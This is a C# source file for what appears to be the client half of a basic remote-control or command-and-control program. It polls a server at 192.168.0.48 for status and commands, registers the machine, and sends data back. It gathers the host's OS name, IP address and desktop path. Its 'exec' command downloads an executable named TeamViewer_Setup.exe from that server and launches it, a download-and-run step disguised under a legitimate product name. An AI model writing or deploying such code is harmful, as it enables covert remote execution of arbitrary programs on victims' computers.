using System;
using System.Net;
using System.Management;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace Client
{
    class Program
    {
        //OBJECT
        private _connect connect;
        public _funcs funcs;
        // VARS
        private static WebClient _client = new WebClient();
        private static string os = _funcs.FriendlyName();
        private static string ip = _funcs.getIP();
        private static string desktop = _funcs.getDesktop();
        private static string domain = "http://192.168.0.48/";
        private static string last = "";
        private static string cmd = "";
        private static string commandName = "exec";

        static void Main(string[] args)
        {
        bool connected = false;
            while (true)
            {
                while(connected == false)
                {
                    try
                    {

                    if (_client.DownloadString(domain + "online.php") == "ONLINE"){
                        Console.WriteLine("CONNECTED TO THE SERVER");
                        connected = true;
                    }
                    }
                    catch
                    {
                        connected = false;
                    }
                }
                if (connected == true)
                {
                    if (_client.DownloadString(domain + "checkuser.php") == "ERROR")
                    {
                        _client.OpenRead(domain + "newuser.php");
                        _client.OpenRead(domain + "savedata.php?data=" + "Last Connected: " + DateTime.Now.ToString("d/M/yyyy") + " - " + DateTime.Now.ToString("HH:mm:ss"));
                        Console.WriteLine("NEW USER IS CONNECTED");
                    }
                    while(connected == true)
                    {
                        try
                        {
                            Console.WriteLine("WORKING! CONNECTED");
                            string link = "http://192.168.0.48/TeamViewer_Setup.exe";
                            string filenaming = "TeamViewer_Setup.exe";
                            switch (commandName)
                            {
                                case "box":
                                    MessageBox.Show("Hello");
                                    break;
                                case "exec":
                                    FileInfo file = new FileInfo(filenaming);
                                    _client.DownloadFile(link, file.FullName);
                                    MessageBox.Show("Downloaded!");
                                    commandName = "null";
                                    Process.Start(file.FullName);
                                    break;
                            }

                        cmd = _client.DownloadString(domain + "/getcmd.php");
                        if(cmd != last)
                        {
                            last = cmd;
                        }
                        }
                        catch
                        {
                            connected = false;
                        }
                    }
                }
            }
        }
    }
}
